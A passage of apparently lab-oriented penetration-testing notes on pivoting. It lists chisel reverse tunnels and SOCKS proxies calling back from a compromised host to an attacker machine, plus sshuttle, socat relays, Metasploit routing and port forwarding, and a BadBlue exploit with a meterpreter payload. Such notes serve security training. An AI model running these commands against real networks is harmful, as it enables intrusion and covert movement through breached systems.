            - `./chisel server -p LISTEN_PORT`
        - from our attacking machine
            - `./chisel client LISTEN_IP:LISTEN_PORT LOCAL_PORT:TARGET_IP:TARGET_PORT`
        - For Example
            - For example, to connect to 172.16.0.5:8000 (the compromised host running a chisel server), forwarding our local port 2222 to 172.16.0.10:22 (our intended target), we could use:
            - `./chisel server -p 8000`
            - `./chisel client 172.16.0.5:8000 2222:172.16.0.10:22`

- Reverse Port Forwarding / Remote Port Forwarding
    - From Compromised machine (Chisel client) to attacker machine (chisel server) for target machine
        - On the atracker machine
            - ``./chisel server -p LISTEN_PORT --reverse &``
        - On the compromised target
            - `./chisel client ATTACKING_IP:LISTEN_PORT R:LOCAL_PORT:TARGET_IP:TARGET_PORT &`
        - For Example
            - let's assume that our own IP is 172.16.0.20, the compromised server's IP is 172.16.0.5, and our target is port 22 on 172.16.0.10. The syntax for forwarding 172.16.0.10:22 back to port 2222 on our attacking machine would be as follows:
                - `./chisel server -p 1337 --reverse &`
                - `./chisel client 172.16.0.20:1337 R:2222:172.16.0.10:22 &`

- SOCKS Proxy

    - Reverse SOCKS proxy
        - from a compromised machine (client) attacking machine (server)
        - On our own attacking machine
            - `./chisel server -p LISTEN_PORT --reverse &`
        - On the compromised host
            - `./chisel client ATTACKING_IP:LISTEN_PORT R:socks &`
        - For Example
            - `./chisel server -p 1337 --reverse &`
            - `./chisel client 10.50.73.2:1337 R:socks &`

    - Forward SOCKS proxy
        - from attacker machine to compromised machine
        - on the compromised host
            - `./chisel server -p LISTEN_PORT --socks5`
        - On our own attacking machine
            - `./chisel client TARGET_IP:LISTEN_PORT PROXY_PORT:socks`
        - For example, `./chisel client 172.16.0.10:8080 1337:socks` would connect to a chisel server running on port 8080 of 172.16.0.10. A SOCKS proxy would be opened on port 1337 of our attacking machine

    - NOTE - Just like SOCKS proxy with SSH Tunnel in chisel also you will have to use word `socks4` or `socks5` for every proxy command, similar to SSH Tunnel we can use `proxychains` or `foxyproxy` here as well

###### SHuttle (proxy)

- Requirements
    - needs Access to the compromised server via `SSH`
    - `Python` also needs to be installed on the server
    - sshuttle only works on Linux targets.

- From Attacker machine to Compromised Machine for target machine
- Syntex
    - `sshuttle -r username@address subnet`
    - `sshuttle -r username@address -N`
    - - `sshuttle -r user@address SUBNET --ssh-cmd "ssh -i KEYFILE" -x compromisedMachineIP`

- Example use
    - `sshuttle -r root@10.200.141.200 10.200.141.0/24 --ssh-cmd "ssh -i ssh_key" -x 10.200.141.200`

###### SOCAT (Port Forwarding)

- Requirements
    - socat binary
        - https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat
        - https://sourceforge.net/projects/unix-utils/files/socat/1.7.3.2/socat-1.7.3.2-1-x86_64.zip/download

- By opening a port on compromised server
    - On compromised server
        - `./socat tcp-l:9090,fork,reuseaddr tcp:10.200.141.150:80 &`
    - From Attacker machine
        - `curl http://10.200.141.200:9090`

- without opening any port on Compromised server
    - On Attacker machine
        - `socat tcp-l:8001 tcp-l:8000,fork,reuseaddr &`
    - On Compromised machine
        - `./socat tcp:10.50.130.14:8001 tcp:10.200.141.150:80,fork &`
    - From Attacker machine
        - `curl http://127.0.0.1:8000`



### Pivoting using metasploit

- Identify the Network interfaces
    - `ipconfig`
- Add route to your current subnet to access other network available
    - `run autoroute -s 10.5.26.0/20`
        - With this we actually addedd route to our msfconsole, now we can access any device from this msfconsole
    - we can also list routes
        - `run autoroute -p`
            - Addiing route wont allow you to execute anythin other than metasloit modules,  so its not like we can do nmap scan on victim 2 just by adding route, but instead we can user modules like portscan etc
- Port scanning on other network IP within same subnet (we already have IP in this case)
    - `search portscan` > `use auxiliary/scanner/portscan/tcp` > `set RHOSTS 10.5.31.52` > `set PORTS 1-100` > `exploit`
        - We observe that we have port 80 open on victim 2, but we still cant access it directly (not by any way)
    - To perform a Nmap scan we will need to Forward port 80 on victim 2 to a port on our local host which is the kali linux instance.
- Port Forwarding
    - `portfwd add -l 1234 -p 80 -r 10.5.31.52`
        - Now we can do nmap scan by specifying port 1234 and kali linux ip/localhost which will eventually do nmap scan for port 80 of victim 2 machine
- Scanning port 80 on victim2 by using port 1234 on our kali
    - `db_nmap -p 1234 -sS -sV localhost`
- Further we can exploit if service running is vulnerable
    - `use windows/http/badblue_passthru` > `set payload windows/meterpreter/bind_tcp` > `set payload windows/meterpreter/bind_tcp` > `set payload windows/meterpreter/bind_tcp` > `set LPORT 4433` > `exploit`


